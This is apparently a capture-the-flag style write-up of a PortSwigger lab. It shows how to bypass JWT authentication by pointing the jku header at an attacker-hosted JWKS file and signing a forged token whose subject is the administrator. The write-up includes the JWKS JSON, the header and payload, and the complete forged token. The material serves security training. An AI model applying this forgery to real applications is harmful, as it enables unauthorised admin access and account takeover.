
# JWT authentication bypass via jku header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip: We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.

---------------------------------------------

References: 

- https://portswigger.net/web-security/jwt

- https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c



![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/1.png)

---------------------------------------------

It llok like the file “/.well-known/jwks.json” does not exist:



![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/2.png)


First I copied the public key part of the RSA key:



![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/3.png)


And create “/jwks.json” in the exploit server. I added the field "use": "sig":





![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/4.png)
![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/5.png)



```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
            "n": "zdCdoh120Xnv9C_UywxJX78dtqOyMS42cXfmnjTYEuShgMd4yABQeUuObibikuytdaopdW0PtY1Q2AYOg0H6A4iBbTzRHNaN85IOb5J7mgiHHp7oIjDlQ6wajZsraj3US4hX3TdK3gcEG-h0EWpSh9A34yfq3HCKLdEVbV0XgRmI3N6Nc_VX5aIcGkoALHZBd9g179CfBtvtUu3cFPZA8eC9iv5xv1AyO4IdlOVdKjNernPu94LzzyYlHObHHWj-BaC5Px4J0jDymdPc9HaLm67nlA0aqZ6KA4HwzZHGJEb2UO_-Ya1HCsRhrnz2e2QRPVAOHgQkPWMKJb6vOFU5OQ"
        }
    ]
}
```


Then I created the JWT:




![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/6.png)


Header with:

- The same “kid” as the public key uploaded
- A “jku” value pointing to the file created in the exploit server

```
{
  "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
  "alg": "RS256",
  "jku": "https://exploit-0a3700d5034894e7808139f701b000a7.exploit-server.net/jwks.json"
}
```

Payload with:

- The “sub” value changed to the user administrator

``` 
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683792794
}
``` 

The JWT:

```
eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTM3MDBkNTAzNDg5NGU3ODA4MTM5ZjcwMWIwMDBhNy5leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTI3OTR9.mY28w-Jf8fMZzO_9qNug5rWXMG8bQq-zpuQLmsQnPPjLziXt5vHOESQeZcCs5wZaagVwkXU9IuRW0mvXsM5AwvuCDG1K22XIP_mL2-RNBQpN_qOE1HVJPIdy-Iq0F1V1DgEAYcNo9QQgcxX1AmhW9AQ0urD4qnLGk8leZYX-J4okBw-583qj2NsgX5zPan_JJ0bqupysw1cy8G9eR4h57wV1wM5oOiGhS5fX2gasKq5RSv4TUQ0Rk6FwONnmNhFJMNKn7HYRxGeoDv-A1118w49G6QSDqWsSuuFgCPy2oLQ-TGMDJBBDBGUNNy-serxOKJ7JjkY9qp1sC9E5hekzHQ
``` 



![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/7.png)


If done with Burp:



![img](images/JWT%20authentication%20bypass%20via%20jku%20header%20injection/8.png)
